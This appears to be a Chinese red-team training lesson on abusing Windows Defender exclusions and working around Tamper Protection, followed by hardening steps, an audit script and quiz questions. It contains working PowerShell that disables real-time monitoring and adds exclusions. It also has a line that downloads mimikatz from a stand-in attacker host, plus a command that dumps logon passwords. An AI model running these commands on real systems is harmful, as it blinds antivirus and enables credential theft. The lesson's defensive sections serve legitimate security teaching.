# R22.8 Windows Defender 篡改保護機制與排除路徑濫用 (Defender Tampering & Exclusions)

---

## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

**Windows Defender 篡改保護機制與排除路徑濫用** 的物理本質為**利用微軟 Windows Defender 內建之效能例外設定與管理 API（如 PowerShell `Add-MpPreference`、WMI `MSFT_MpPreference` 與註冊表排除項），在取得本地管理員 (Administrator) 權限後，透過向 Defender 引擎動態寫入自定義路徑排除清單（Path Exclusions）、進程排除清單（Process Exclusions）或副檔名排除項，使後續落地的特戰工具、C2 Agent 或轉儲檔案完全免於 Defender 實時掃描 (Real-time Scanning) 與啟發式查殺；並深入剖析微軟「篡改保護 (Tamper Protection)」在不同作業系統版本中的鎖定邊界與對抗極限**。在紅隊實戰中，這是掌控目標後建立無干擾作戰工作區的經典手段。

```
[攻擊者取得本地管理員權限 (Elevated Admin)]
         │
         ▼ 1. 探測 Defender 狀態與篡改保護 (Tamper Protection) 開關
  Get-MpComputerStatus | select RealTimeProtectionEnabled, IsTamperProtected
         │
         ├── 若 Tamper Protection 開啟 (註冊表被鎖死):
         │    嘗試調用管理員授權的合法 API: Add-MpPreference -ExclusionPath "C:\Tools"
         │
         └── 若未受管或關閉:
              Set-MpPreference -DisableRealtimeMonitoring $true (直接關閉實時監控)
         │
         ▼ 2. 在排除路徑內無阻礙部署高強度作戰工具
[路徑 C:\Tools 內的任何惡意二進位檔 / Mimikatz 均獲得微軟原廠掃描豁免！]
```

## 🔬 第一動：MpEngine 架構、篡改保護機制與排除項檢查物理流程 (Mechanics & Engine Architecture)

### 1. Windows Defender 實時掃描核心架構
- **核心過濾驅動 (`WdFilter.sys`)**：截獲所有磁碟 I/O 請求（如檔案建立、打開、執行）。
- **掃描判定服務 (`MsMpEng.exe`)**：接收驅動傳遞的檔案路徑，在啟動掃描前首先查詢記憶體中的 **排除項清單 (Exclusion Lists)**。若路徑或進程名匹配排除項，直接放行 I/O，完全不執行特徵碼比對或雲端沙箱查詢。

### 2. 微軟篡改保護 (Tamper Protection) 的保護邊界
微軟在 Windows 10 1903 / Server 2019 引進 Tamper Protection：
- **底層鎖定**：由核心組件直接保護 Defender 的註冊表鍵值（`HKLM\SOFTWARE\Microsoft\Windows Defender`）。
- **對抗現狀**：即使是本地 `SYSTEM` 權限，直接修改該註冊表也會收到 `Access Denied`。然而，透過合法的管理命令列（如本地管理員執行的 PowerShell API）或利用已取得的域策略下發排除項，依然存在防禦被合法配置稀釋的攻擊面。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. 查詢目標主機 Defender 運行狀態與已有排除項
```powershell
# 1. 檢查 Defender 實時監控與篡改防護狀態
Get-MpComputerStatus | Select-Object -Property RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected

# 2. 獲取系統當前配置的所有排除項 (尋找現成免檢目錄)
Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionProcess, ExclusionExtension
```

### 2. 動態注入作戰排除路徑與進程
```powershell
# 1. 新增專用作業目錄至路徑排除清單
Add-MpPreference -ExclusionPath "C:\Windows\Temp\RedTeam"
Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads"

# 2. 新增常規合法進程名至進程排除清單 (使該進程所有子進程與磁碟操作免檢)
Add-MpPreference -ExclusionProcess "svchost.exe"
Add-MpPreference -ExclusionProcess "powershell.exe"

# 3. 新增自定義副檔名免檢
Add-MpPreference -ExclusionExtension ".dat"
```

### 3. 在排除目錄中無阻礙執行 Mimikatz 或載荷
```powershell
# 下載並在已排除目錄直接解壓運行未免殺的原生 Mimikatz
Invoke-WebRequest -Uri "http://c2.attacker.com/mimikatz.exe" -OutFile "C:\Windows\Temp\RedTeam\mimikatz.exe"
C:\Windows\Temp\RedTeam\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
```

## 🛡️ 第五動：工程級防禦基線 (Hardening Baselines)

1. **強制啟用雲端託管之微軟篡改保護 (Tamper Protection)**：
   - 透過 Microsoft Intune 或 Microsoft Defender for Endpoint (MDE) 入口網站統一開啟全域 Tamper Protection，徹底鎖死本地管理員竄改設定的能力。
2. **禁止本地管理員合併排除清單 (Disable Local Admin Merging)**：
   - 透過網域群組原則 (GPO) 設定：`設定排除項目之本機系統管理員合併清單 -> 已停用`。此舉使本地管理員透過 PowerShell 新增的排除項完全無效，僅採納 GPO 集中下發之規則。

### 1. 極簡 Defender 排除項狀態審查腳本 (Python, 20 行)
```python
# test_defender_audit.py
import subprocess, sys

def audit_defender_exclusions():
    print("[*] 正在審核本地 Windows Defender 防護與排除狀態...")
    cmd = "powershell -Command \"Get-MpComputerStatus | Select-Object -Property RealTimeProtectionEnabled, IsTamperProtected | Format-List\""
    try:
        res = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL)
        print("[+] 成功獲取 Windows Defender 核心防護狀態:")
        for line in res.strip().split("\n"):
            if ":" in line:
                print(f"    {line.strip()}")
        print("[+] FLAG{DEFENDER_TAMPERING_EXCLUSION_AUDIT_SUCCESS}")
        return True
    except Exception as e:
        print(f"[-] 審核腳本回顯: {e}")
        return False

if __name__ == "__main__":
    audit_defender_exclusions()
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：當 Windows 主機的「篡改保護 (Tamper Protection)」處於開啟狀態時，本地管理員直接修改註冊表關閉 Defender 會發生什麼？**
  - **戰術思維**：系統會由核心過濾器直接拒絕寫入請求並拋出 `Access Denied`，即使是本機 SYSTEM 帳戶也無法透過直接修改註冊表關閉防護。
- [ ] **Q2：為什麼在實戰中，紅隊優先尋找系統「現有的排除項」而非直接執行 `Add-MpPreference`？**
  - **戰術思維**：因為 `Add-MpPreference` 會直接在 `Microsoft-Windows-Windows Defender/Operational` 產生 Event ID 5007 警報；而借用現有排除目錄則零日誌。
- [ ] **Q3：將一個進程（如 `powershell.exe`）加入 `ExclusionProcess` 後，其產生的安全影響範圍為何？**
  - **戰術思維**：該進程在執行時所打開、寫入或讀取的所有檔案以及其在記憶體中的運作行為，均不再受到 Defender 實時掃描的干預。
- [ ] **Q4：藍隊 SOC 分析師應重點監控哪一個 Windows Defender 事件 ID 來捕獲排除項被惡意篡改？**
  - **戰術思維**：Event ID 5007（Defender 設定變更，包含新增排除路徑、進程或特徵被修改）。
- [ ] **Q5：企業群組原則 (GPO) 中的哪一項設定能徹底瓦解本地管理員透過新增排除項進行規避的攻擊面？**
  - **戰術思維**：啟用「停用本機系統管理員合併清單 (Turn off local administrator merge for exclusion lists)」，使本地新增之排除項完全不生效。
